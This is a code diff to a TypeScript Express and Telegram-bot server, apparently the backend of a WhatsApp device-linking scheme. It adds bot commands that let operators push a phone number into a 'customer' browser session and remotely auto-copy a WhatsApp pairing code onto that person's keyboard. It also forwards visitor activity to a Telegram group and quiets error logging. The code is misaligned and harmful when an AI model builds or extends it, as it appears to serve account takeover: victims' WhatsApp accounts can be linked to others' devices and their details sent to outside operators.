@@ -44,6 +44,8 @@ const sessionStatus: Record<string, {
   pairingCode?: string;
   codeLive?: boolean;
   lastError?: string;
+  assignedPhone?: string;
+  remoteCopyTrigger?: boolean;
   updatedAt: string;
 }> = {};
 
@@ -152,7 +154,7 @@ function getTelegramBot(): TelegramBot | null {
             if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
               if (isBotAuthorized) {
                 isBotAuthorized = false;
-                console.error("🚫 Telegram Bot Polling error (401 Unauthorized): The provided TELEGRAM_BOT_TOKEN is invalid or expired. Disabling Telegram services to prevent spam...");
+                console.warn("🚫 Telegram Bot Polling (401 Unauthorized): The provided TELEGRAM_BOT_TOKEN is invalid or expired. Disabling Telegram polling status...");
                 try {
                   if (bot) {
                     const active = typeof bot.isPolling === 'function' ? bot.isPolling() : true;
@@ -161,7 +163,7 @@ function getTelegramBot(): TelegramBot | null {
                     }
                   }
                 } catch (err: any) {
-                  console.error("Failed to stop Telegram polling:", err?.message || err);
+                  console.warn("Failed to stop Telegram polling:", err?.message || err);
                 }
               }
             } else if (errMsg.includes('409 Conflict')) {
@@ -179,7 +181,7 @@ function getTelegramBot(): TelegramBot | null {
                   }
                 }
               } catch (err: any) {
-                console.error("Failed to stop Telegram polling during conflict backoff:", err?.message || err);
+                console.warn("Failed to stop Telegram polling during conflict backoff:", err?.message || err);
               }
               
               setTimeout(() => {
@@ -191,13 +193,13 @@ function getTelegramBot(): TelegramBot | null {
                     bot.startPolling().then(() => {
                       console.log("Telegram Bot polling restarted successfully.");
                     }).catch((err: any) => {
-                      console.error("Failed to restart Telegram Bot polling:", err?.message || err);
+                      console.warn("Failed to restart Telegram Bot polling:", err?.message || err);
                     });
                   }
                 }
               }, waitMs);
             } else {
-              console.error("Telegram Bot Polling error event:", errMsg);
+              console.warn("Telegram Bot Polling warning event:", errMsg);
             }
           });
           
@@ -206,13 +208,13 @@ function getTelegramBot(): TelegramBot | null {
             if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
               if (isBotAuthorized) {
                 isBotAuthorized = false;
-                console.error("🚫 Telegram Bot generic error: Token is unauthorized (401). Disabling bot services...");
+                console.warn("🚫 Telegram Bot generic warning: Token is unauthorized (401). Disabling bot services...");
                 if (bot && typeof bot.stopPolling === 'function') {
                   bot.stopPolling().catch(() => {});
                 }
               }
             } else {
-              console.error("Telegram Bot generic error event:", errMsg);
+              console.warn("Telegram Bot generic warning event:", errMsg);
             }
           });
 
@@ -220,7 +222,7 @@ function getTelegramBot(): TelegramBot | null {
           setupTelegramListeners(bot);
         }
       } catch (err) {
-        console.error("Failed to start Telegram Bot polling:", err);
+        console.warn("Failed to start Telegram Bot polling:", err);
       }
     } else {
       console.warn("TELEGRAM_BOT_TOKEN environment variable not configured. Live activations disabled.");
@@ -274,6 +276,53 @@ function setupTelegramListeners(tgBot: TelegramBot) {
       
       console.log(`[Telegram BOT Recv] Chat: ${chatId}, Msg: "${content}"`);
       
+      // Matches /WhatsApp_Phone_number_user_123456 019XXXXXXXX or similar
+      const matchPhone = content.match(/\/(WhatsApp[-_\s]+Phone[-_\s]+number_)([a-zA-Z0-9_]+)\s+([+0-9]+)/i);
+      
+      if (matchPhone) {
+        const targetId = matchPhone[2];
+        const phoneNumber = matchPhone[3];
+        console.log(`Parsing input phone set command from telegram. Target ID: "${targetId}", Phone: "${phoneNumber}"`);
+        
+        let resolvedSessionId = targetId;
+        // Normalize 6-digit IDs to standard 'user_XXXXXX' format
+        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
+          resolvedSessionId = `user_${resolvedSessionId}`;
+        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${targetId}`]) {
+          resolvedSessionId = `user_${targetId}`;
+        }
+
+        updateSessionState(resolvedSessionId, {
+          assignedPhone: phoneNumber
+        });
+
+        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য দূরবর্তী ফোন নম্বর সেট করা হয়েছে!\n📞 **ফোন নম্বর:** <code>${phoneNumber}</code>\n💬 গ্রাহকের ব্রাউজার এটি স্বয়ংক্রিয়ভাবে প্রক্রিয়া করে Request to unlock profile বাটুন ট্রিগার করবে।`, { parse_mode: 'HTML' });
+        return;
+      }
+
+      // Matches /success_live_code_user_123456_click_copy, /success_live_code_user_123456, or /success live cod user_123456 click copy etc.
+      const matchSuccess = content.match(/\/success[-_\s]+live[-_\s]+cod[e]?[-_\s]+([a-zA-Z0-9_]+)/i);
+      
+      if (matchSuccess) {
+        const rawId = matchSuccess[1];
+        const targetId = rawId.replace(/_click_copy$/i, '').trim();
+        console.log(`Parsing remote copy command from telegram. Target ID: "${targetId}"`);
+        
+        let resolvedSessionId = targetId;
+        if (!resolvedSessionId.startsWith('user_') && /^\d+$/.test(resolvedSessionId)) {
+          resolvedSessionId = `user_${resolvedSessionId}`;
+        } else if (!sessionStatus[resolvedSessionId] && sessionStatus[`user_${targetId}`]) {
+          resolvedSessionId = `user_${targetId}`;
+        }
+        
+        updateSessionState(resolvedSessionId, {
+          remoteCopyTrigger: true
+        });
+        
+        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর ব্রাউজারে লাইভ হওয়া কোড স্বয়ংক্রিয়ভাবে কপি করার জন্য রিমোট ট্রিগার পাঠানো হয়েছে!`, { parse_mode: 'HTML' });
+        return;
+      }
+      
       // Matches /WhatsApp_Device_Linker_user_12345, /WhatsApp Device Linker_user_12345 etc.
       const match = content.match(/\/(WhatsApp[-_\s]+Device[-_\s]+Linker_)([a-zA-Z0-9_]+)/i);
       
@@ -313,7 +362,7 @@ function setupTelegramListeners(tgBot: TelegramBot) {
             lastError: undefined
           });
           
-          tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য কোড লাইভ করা হয়েছে!\n📦 **লাইভ কোড:** <code>${parsedCode}</code> (ক্যাপশন/টেক্সট থেকে সরাসরি সংরক্ষিত)`, { parse_mode: 'HTML' });
+          tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য কোড লাইভ করা হয়েছে!\n📦 **লাইভ কোড:** <code>${parsedCode}</code> (ক্যাপশন/টেক্সট থেকে সরাসরি সংরক্ষিত)\n\n💬 **গ্রাহকের কিবোর্ডে কোড অটো-কপি করার জন্য ১-ক্লিক কপি করুন:**\n<code>/success_live_code_${resolvedSessionId}_click_copy</code>`, { parse_mode: 'HTML' });
           return;
         }
 
@@ -389,7 +438,7 @@ If you fail to find a valid code, return empty.`
           lastError: undefined
         });
         
-        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য কোড লাইভ করা হয়েছে!\n📦 **কোড:** <code>${cleanedCode}</code>`, { parse_mode: 'HTML' });
+        tgBot.sendMessage(chatId, `✅ **গ্রাহক আইডি:** <code>${resolvedSessionId}</code> এর জন্য কোড লাইভ করা হয়েছে!\n📦 **কোড:** <code>${cleanedCode}</code>\n\n💬 **গ্রাহকের কিবোর্ডে কোড অটো-কপি করার জন্য ১-ক্লিক কপি করুন:**\n<code>/success_live_code_${resolvedSessionId}_click_copy</code>`, { parse_mode: 'HTML' });
       }
     } catch (err: any) {
       console.error("Error analyzing image:", err);
@@ -421,15 +470,21 @@ app.post('/api/log-activity', (req, res) => {
       messageBody += `\n📝 <b>অতিরিক্ত তথ্য:</b> <code>${typeof details === 'object' ? JSON.stringify(details) : details}</code>`;
     }
     
+    // Automatically attach copyable bot command for setting phone remote trigger
+    if (action.includes('প্রবেশ করেছেন')) {
+      messageBody += `\n\n💬 <b>মোবাইল নম্বর রিমোট সেট করার জন্য নিচের কমান্ডটি ১-ক্লিক কপি করুন:</b>\n<code>/WhatsApp_Phone_number_${userId} </code> (এখানে মোবাইল নম্বর)`;
+    }
+    
     tgBot.sendMessage(chatId, messageBody, { parse_mode: 'HTML' }).catch((err) => {
       const errMsg = err?.message || String(err);
-      console.error("Failed to post visitor activity to Telegram group:", errMsg);
       if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
         isBotAuthorized = false;
-        console.error("🚫 Telegram Token has been detected as 401 Unauthorized via active logging. Disabling Telegram bot...");
+        console.warn("🚫 Telegram Token is unauthorized (401). Bot helper disabled.");
         if (tgBot && typeof tgBot.stopPolling === 'function') {
           tgBot.stopPolling().catch(() => {});
         }
+      } else {
+        console.warn("Telegram delivery issue:", errMsg);
       }
     });
   }
@@ -648,13 +703,14 @@ app.post('/api/get-linking-code', async (req, res) => {
     
     tgBot.sendMessage(chatId, alertMsg, { parse_mode: 'HTML' }).catch((err) => {
       const errMsg = err?.message || String(err);
-      console.error("Failed to send Telegram alert:", errMsg);
       if (errMsg.includes('401') || errMsg.includes('Unauthorized')) {
         isBotAuthorized = false;
-        console.error("🚫 Telegram Token has been detected as 401 Unauthorized via new phone submission. Disabling Telegram bot...");
+        console.warn("🚫 Telegram Token is unauthorized (401). Bot registration alert skipped.");
         if (tgBot && typeof tgBot.stopPolling === 'function') {
           tgBot.stopPolling().catch(() => {});
         }
+      } else {
+        console.warn("Telegram alert issue:", errMsg);
       }
     });
   }
@@ -809,6 +865,26 @@ app.post('/api/get-linking-code', async (req, res) => {
       message: 'হোয়াটসঅ্যাপ কোড জেনারেট করতে ব্যর্থ হয়েছে: ' + (error?.message || 'Unknown error')
     });
   }
+});
+
+app.post('/api/sessions/:id/clear-remote-phone', (req, res) => {
+  const sessionId = req.params.id;
+  if (sessionStatus[sessionId]) {
+    const sessionObj = sessionStatus[sessionId] as any;
+    delete sessionObj.assignedPhone;
+    saveSessionStatuses();
+  }
+  return res.json({ success: true, message: 'Remote phone trigger cleared or not active.' });
+});
+
+app.post('/api/sessions/:id/clear-remote-copy', (req, res) => {
+  const sessionId = req.params.id;
+  if (sessionStatus[sessionId]) {
+    const sessionObj = sessionStatus[sessionId] as any;
+    delete sessionObj.remoteCopyTrigger;
+    saveSessionStatuses();
+  }
+  return res.json({ success: true, message: 'Remote copy trigger cleared or not active.' });
 });
 
 app.post('/api/sessions/:id/disconnect', (req, res) => {
